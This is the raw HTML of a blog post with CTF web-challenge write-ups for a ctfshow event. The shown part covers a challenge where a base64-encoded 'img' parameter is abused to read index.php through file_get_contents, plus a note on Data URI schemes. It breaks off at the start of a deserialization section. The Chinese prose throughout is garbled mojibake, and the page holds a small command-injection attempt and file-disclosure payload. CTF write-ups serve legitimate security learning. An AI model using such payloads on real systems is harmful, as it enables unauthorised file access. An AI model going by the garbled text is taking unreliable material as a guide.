<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ctfshow-æ„šäººæ¯-web easy_signin 1.åšé¢˜æ€è·¯ è§‚å¯ŸURLï¼Œå‘ç°æœ‰GETä¼ å‚imgï¼Œä¼ å‚å†…å®¹æ˜¯base64
?img=ZmFjZS5wbmc= base64è§£ç åå‘ç°ä¼ å‚å†…å®¹æ˜¯face.png
ä¼ å‚system(&amp;ldquo;ls&amp;rdquo;)ï¼›ç»è¿‡ç¼–ç åçš„base64ï¼Œå‘ç°è¿”å› Warning: file_get_contents(system(&amp;ldquo;ls&amp;rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18 çœ‹åˆ°äº†æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œè€Œä¸”çœ‹åˆ°è·¯å¾„æœ‰ä¸ªindex.phpï¼Œè¯•ç€è¯»å–ä¸€ä¸‹çœ‹çœ‹ ä¼ å‚åï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå°†å…¶base64å¤åˆ¶ï¼Œç„¶åè§£ç ï¼Œæ‹¿åˆ°flag
2.çŸ¥è¯†ç‚¹ Data URI scheme 1 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA Data URI schemeæ˜¯åœ¨RFC2397ä¸­å®šä¹‰çš„ï¼Œç›®çš„æ˜¯å°†ä¸€äº›å°çš„æ•°æ®ï¼Œç›´æ¥åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œä¸ç”¨å†ä»å¤–éƒ¨æ–‡ä»¶è½½å…¥ã€‚æ¯”å¦‚ä¸Šé¢é‚£ä¸²å­—ç¬¦ï¼Œå…¶å®æ˜¯ä¸€å¼ å°å›¾ç‰‡ï¼Œdataè¡¨ç¤ºå–å¾—æ•°æ®çš„åå®šåç§°ï¼Œimage/png æ˜¯æ•°æ®ç±»å‹åç§°ï¼Œbase64 æ˜¯æ•°æ®çš„ç¼–ç æ–¹æ³•ï¼Œé€—å·åé¢å°±æ˜¯è¿™ä¸ªimage/pngæ–‡ä»¶base64ç¼–ç åçš„æ•°æ®ã€‚
Data URI schemeæ”¯æŒçš„ç±»å‹æœ‰ï¼š
data:,æ–‡æœ¬æ•°æ® data:text/plain,æ–‡æœ¬æ•°æ® data:text/html,HTMLä»£ç  data:text/html;base64,base64ç¼–ç çš„HTMLä»£ç  data:text/css,CSSä»£ç  data:text/css;base64,base64ç¼–ç çš„CSSä»£ç  data:text/javascript,Javascriptä»£ç  data:text/javascript;base64,base64ç¼–ç çš„Javascriptä»£ç  data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ® data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ® data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ® data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ® 3.payload 1 2 ?img=aW5kZXgucGhw // index.phpï¼Œbase64ç¼–ç ï¼šaW5kZXgucGhw è¢«é—å¿˜çš„ååºåˆ—åŒ– 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 &amp;lt;?'>
<title>ctfshow-æ„šäººæ¯-web</title>

<link rel='canonical' href='https://relish1one.github.io/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/'>

<link rel="stylesheet" href="/scss/style.min.b520104728805017af298ac0ca9dc201454dbb7fb91074b04767eaca6465f278.css"><meta property='og:title' content='ctfshow-æ„šäººæ¯-web'>
<meta property='og:description' content='ctfshow-æ„šäººæ¯-web easy_signin 1.åšé¢˜æ€è·¯ è§‚å¯ŸURLï¼Œå‘ç°æœ‰GETä¼ å‚imgï¼Œä¼ å‚å†…å®¹æ˜¯base64
?img=ZmFjZS5wbmc= base64è§£ç åå‘ç°ä¼ å‚å†…å®¹æ˜¯face.png
ä¼ å‚system(&amp;ldquo;ls&amp;rdquo;)ï¼›ç»è¿‡ç¼–ç åçš„base64ï¼Œå‘ç°è¿”å› Warning: file_get_contents(system(&amp;ldquo;ls&amp;rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18 çœ‹åˆ°äº†æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œè€Œä¸”çœ‹åˆ°è·¯å¾„æœ‰ä¸ªindex.phpï¼Œè¯•ç€è¯»å–ä¸€ä¸‹çœ‹çœ‹ ä¼ å‚åï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå°†å…¶base64å¤åˆ¶ï¼Œç„¶åè§£ç ï¼Œæ‹¿åˆ°flag
2.çŸ¥è¯†ç‚¹ Data URI scheme 1 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA Data URI schemeæ˜¯åœ¨RFC2397ä¸­å®šä¹‰çš„ï¼Œç›®çš„æ˜¯å°†ä¸€äº›å°çš„æ•°æ®ï¼Œç›´æ¥åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œä¸ç”¨å†ä»å¤–éƒ¨æ–‡ä»¶è½½å…¥ã€‚æ¯”å¦‚ä¸Šé¢é‚£ä¸²å­—ç¬¦ï¼Œå…¶å®æ˜¯ä¸€å¼ å°å›¾ç‰‡ï¼Œdataè¡¨ç¤ºå–å¾—æ•°æ®çš„åå®šåç§°ï¼Œimage/png æ˜¯æ•°æ®ç±»å‹åç§°ï¼Œbase64 æ˜¯æ•°æ®çš„ç¼–ç æ–¹æ³•ï¼Œé€—å·åé¢å°±æ˜¯è¿™ä¸ªimage/pngæ–‡ä»¶base64ç¼–ç åçš„æ•°æ®ã€‚
Data URI schemeæ”¯æŒçš„ç±»å‹æœ‰ï¼š
data:,æ–‡æœ¬æ•°æ® data:text/plain,æ–‡æœ¬æ•°æ® data:text/html,HTMLä»£ç  data:text/html;base64,base64ç¼–ç çš„HTMLä»£ç  data:text/css,CSSä»£ç  data:text/css;base64,base64ç¼–ç çš„CSSä»£ç  data:text/javascript,Javascriptä»£ç  data:text/javascript;base64,base64ç¼–ç çš„Javascriptä»£ç  data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ® data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ® data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ® data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ® 3.payload 1 2 ?img=aW5kZXgucGhw // index.phpï¼Œbase64ç¼–ç ï¼šaW5kZXgucGhw è¢«é—å¿˜çš„ååºåˆ—åŒ– 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 &amp;lt;?'>
<meta property='og:url' content='https://relish1one.github.io/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/'>
<meta property='og:site_name' content='R1one&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='ctfshow' /><meta property='article:tag' content='æ„šäººæ¯' /><meta property='article:tag' content='ååºåˆ—åŒ–' /><meta property='article:tag' content='SSTI' /><meta property='article:tag' content='session' /><meta property='article:published_time' content='2023-05-29T13:02:16&#43;08:00'/><meta property='article:modified_time' content='2023-05-29T13:02:16&#43;08:00'/>
<meta name="twitter:title" content="ctfshow-æ„šäººæ¯-web">
<meta name="twitter:description" content="ctfshow-æ„šäººæ¯-web easy_signin 1.åšé¢˜æ€è·¯ è§‚å¯ŸURLï¼Œå‘ç°æœ‰GETä¼ å‚imgï¼Œä¼ å‚å†…å®¹æ˜¯base64
?img=ZmFjZS5wbmc= base64è§£ç åå‘ç°ä¼ å‚å†…å®¹æ˜¯face.png
ä¼ å‚system(&amp;ldquo;ls&amp;rdquo;)ï¼›ç»è¿‡ç¼–ç åçš„base64ï¼Œå‘ç°è¿”å› Warning: file_get_contents(system(&amp;ldquo;ls&amp;rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18 çœ‹åˆ°äº†æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œè€Œä¸”çœ‹åˆ°è·¯å¾„æœ‰ä¸ªindex.phpï¼Œè¯•ç€è¯»å–ä¸€ä¸‹çœ‹çœ‹ ä¼ å‚åï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå°†å…¶base64å¤åˆ¶ï¼Œç„¶åè§£ç ï¼Œæ‹¿åˆ°flag
2.çŸ¥è¯†ç‚¹ Data URI scheme 1 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA Data URI schemeæ˜¯åœ¨RFC2397ä¸­å®šä¹‰çš„ï¼Œç›®çš„æ˜¯å°†ä¸€äº›å°çš„æ•°æ®ï¼Œç›´æ¥åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œä¸ç”¨å†ä»å¤–éƒ¨æ–‡ä»¶è½½å…¥ã€‚æ¯”å¦‚ä¸Šé¢é‚£ä¸²å­—ç¬¦ï¼Œå…¶å®æ˜¯ä¸€å¼ å°å›¾ç‰‡ï¼Œdataè¡¨ç¤ºå–å¾—æ•°æ®çš„åå®šåç§°ï¼Œimage/png æ˜¯æ•°æ®ç±»å‹åç§°ï¼Œbase64 æ˜¯æ•°æ®çš„ç¼–ç æ–¹æ³•ï¼Œé€—å·åé¢å°±æ˜¯è¿™ä¸ªimage/pngæ–‡ä»¶base64ç¼–ç åçš„æ•°æ®ã€‚
Data URI schemeæ”¯æŒçš„ç±»å‹æœ‰ï¼š
data:,æ–‡æœ¬æ•°æ® data:text/plain,æ–‡æœ¬æ•°æ® data:text/html,HTMLä»£ç  data:text/html;base64,base64ç¼–ç çš„HTMLä»£ç  data:text/css,CSSä»£ç  data:text/css;base64,base64ç¼–ç çš„CSSä»£ç  data:text/javascript,Javascriptä»£ç  data:text/javascript;base64,base64ç¼–ç çš„Javascriptä»£ç  data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ® data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ® data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ® data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ® 3.payload 1 2 ?img=aW5kZXgucGhw // index.phpï¼Œbase64ç¼–ç ï¼šaW5kZXgucGhw è¢«é—å¿˜çš„ååºåˆ—åŒ– 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 &amp;lt;?">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/ava_hu23b1ce8b171806f482798fb1ab4dbf94_485038_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">R1one&#39;s Blog</a></h1>
            <h2 class="site-description">ä¿æŒçƒ­çˆ±ï¼Œäº«å—å­¤ç‹¬</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/Relish1one'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
                <li id="i18n-switch">  
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
                        
                            <option value="https://relish1one.github.io/" selected>English</option>
                        
                            <option value="https://relish1one.github.io/zh-cn/" >ä¸­æ–‡</option>
                        
                    </select>
                </li>
            
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#easy_signin">easy_signin</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1åšé¢˜æ€è·¯">1.åšé¢˜æ€è·¯</a></li>
            <li><a href="#2çŸ¥è¯†ç‚¹">2.çŸ¥è¯†ç‚¹</a></li>
            <li><a href="#3payload">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#è¢«é—å¿˜çš„ååºåˆ—åŒ–">è¢«é—å¿˜çš„ååºåˆ—åŒ–</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1åšé¢˜æ€è·¯-1">1.åšé¢˜æ€è·¯</a></li>
            <li><a href="#2çŸ¥è¯†ç‚¹-1">2.çŸ¥è¯†ç‚¹</a></li>
            <li><a href="#3payload-1">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_ssti">easy_ssti</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1åšé¢˜æ€è·¯-2">1.åšé¢˜æ€è·¯</a></li>
            <li><a href="#2sstiæ³¨å…¥">2.SSTIæ³¨å…¥</a></li>
            <li><a href="#3payload-2">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#æš—ç½‘èŠå¤©å®¤">æš—ç½‘èŠå¤©å®¤</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1åšé¢˜æ€è·¯-3">1.åšé¢˜æ€è·¯</a></li>
            <li><a href="#2payloadä¸€æŠŠæ¢­è„šæœ¬">2.payloadï¼šä¸€æŠŠæ¢­è„šæœ¬</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_flask">easy_flask</a>
      <ol>
        <li>
          <ol>
            <li><a href="#flaskçš„sessionä¼ªé€ ä»»æ„æ–‡ä»¶ä¸‹è½½pythonå‘½ä»¤æ‰§è¡Œ">flaskçš„sessionä¼ªé€ +ä»»æ„æ–‡ä»¶ä¸‹è½½+pythonå‘½ä»¤æ‰§è¡Œ</a></li>
            <li><a href="#1åšé¢˜æ€è·¯-4">1.åšé¢˜æ€è·¯</a></li>
            <li><a href="#2payload">2.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_php">easy_php</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1é¢˜ç›®åˆ†æ">1.é¢˜ç›®åˆ†æ</a></li>
            <li><a href="#2çŸ¥è¯†ç‚¹-2">2.çŸ¥è¯†ç‚¹</a></li>
            <li><a href="#3payload-3">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_class">easy_class</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1ä»£ç åˆ†æ">1.ä»£ç åˆ†æ</a></li>
            <li><a href="#2payload-1">2.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctfshow/" >
                ctfshow
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/">ctfshow-æ„šäººæ¯-web</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">May 29, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    15 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="ctfshow-æ„šäººæ¯-web">ctfshow-æ„šäººæ¯-web</h1>
<h2 id="easy_signin">easy_signin</h2>
<h4 id="1åšé¢˜æ€è·¯">1.åšé¢˜æ€è·¯</h4>
<p>è§‚å¯ŸURLï¼Œå‘ç°æœ‰GETä¼ å‚imgï¼Œä¼ å‚å†…å®¹æ˜¯base64</p>
<p>?img=ZmFjZS5wbmc=
base64è§£ç åå‘ç°ä¼ å‚å†…å®¹æ˜¯face.png</p>
<p>ä¼ å‚system(&ldquo;ls&rdquo;)ï¼›ç»è¿‡ç¼–ç åçš„base64ï¼Œå‘ç°è¿”å›
Warning: file_get_contents(system(&ldquo;ls&rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18
çœ‹åˆ°äº†æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œè€Œä¸”çœ‹åˆ°è·¯å¾„æœ‰ä¸ªindex.phpï¼Œè¯•ç€è¯»å–ä¸€ä¸‹çœ‹çœ‹
ä¼ å‚åï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå°†å…¶base64å¤åˆ¶ï¼Œç„¶åè§£ç ï¼Œæ‹¿åˆ°flag</p>
<h4 id="2çŸ¥è¯†ç‚¹">2.çŸ¥è¯†ç‚¹</h4>
<h5 id="data-uri-scheme">Data URI scheme</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA
</span></span></code></pre></td></tr></table>
</div>
</div><p>Data URI schemeæ˜¯åœ¨RFC2397ä¸­å®šä¹‰çš„ï¼Œç›®çš„æ˜¯å°†ä¸€äº›å°çš„æ•°æ®ï¼Œç›´æ¥åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œä¸ç”¨å†ä»å¤–éƒ¨æ–‡ä»¶è½½å…¥ã€‚æ¯”å¦‚ä¸Šé¢é‚£ä¸²å­—ç¬¦ï¼Œå…¶å®æ˜¯ä¸€å¼ å°å›¾ç‰‡ï¼Œdataè¡¨ç¤ºå–å¾—æ•°æ®çš„åå®šåç§°ï¼Œimage/png æ˜¯æ•°æ®ç±»å‹åç§°ï¼Œbase64 æ˜¯æ•°æ®çš„ç¼–ç æ–¹æ³•ï¼Œé€—å·åé¢å°±æ˜¯è¿™ä¸ªimage/pngæ–‡ä»¶base64ç¼–ç åçš„æ•°æ®ã€‚</p>
<p>Data URI schemeæ”¯æŒçš„ç±»å‹æœ‰ï¼š</p>
<ul>
<li>data:,æ–‡æœ¬æ•°æ®</li>
<li>data:text/plain,æ–‡æœ¬æ•°æ®</li>
<li>data:text/html,HTMLä»£ç </li>
<li>data:text/html;base64,base64ç¼–ç çš„HTMLä»£ç </li>
<li>data:text/css,CSSä»£ç </li>
<li>data:text/css;base64,base64ç¼–ç çš„CSSä»£ç </li>
<li>data:text/javascript,Javascriptä»£ç </li>
<li>data:text/javascript;base64,base64ç¼–ç çš„Javascriptä»£ç </li>
<li>data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ®</li>
<li>data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ®</li>
<li>data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ®</li>
<li>data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ®</li>
</ul>
<h4 id="3payload">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?img=aW5kZXgucGhw
</span></span><span class="line"><span class="cl">// index.phpï¼Œbase64ç¼–ç ï¼šaW5kZXgucGhw
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="è¢«é—å¿˜çš„ååºåˆ—åŒ–">è¢«é—å¿˜çš„ååºåˆ—åŒ–</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
